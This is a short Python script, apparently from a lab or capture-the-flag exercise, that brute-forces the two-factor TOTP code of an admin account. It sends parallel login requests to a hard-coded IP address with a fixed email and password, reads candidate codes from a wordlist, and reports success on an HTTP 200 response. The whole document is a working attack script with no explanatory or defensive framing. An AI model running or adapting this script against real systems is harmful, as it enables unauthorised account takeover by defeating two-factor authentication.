import requests
import sys
import json
from concurrent.futures import ThreadPoolExecutor

url = "http://138.195.248.4:5000/api/login"


def try_password(totp):
    password = "admin"
    headers = {"Content-Type": "application/json"}
    data = {"email": "admin@trade.local", "password": password, "totp": totp}
    data_json = json.dumps(data)

    r = requests.post(url, data=data_json, headers=headers, verify=False)
    if r.status_code == 200:
        print("[+] Password found: " + password)
        sys.exit()


def brute_parallel(totps):
    with ThreadPoolExecutor(max_workers=4) as executor:
        executor.map(try_password, totps)


if __name__ == "__main__":
    with open("/home/kali-user/Documents/tracs3/digits_reversed.txt", "r") as f:
        totps = [line.strip() for line in f]

    brute_parallel(totps)
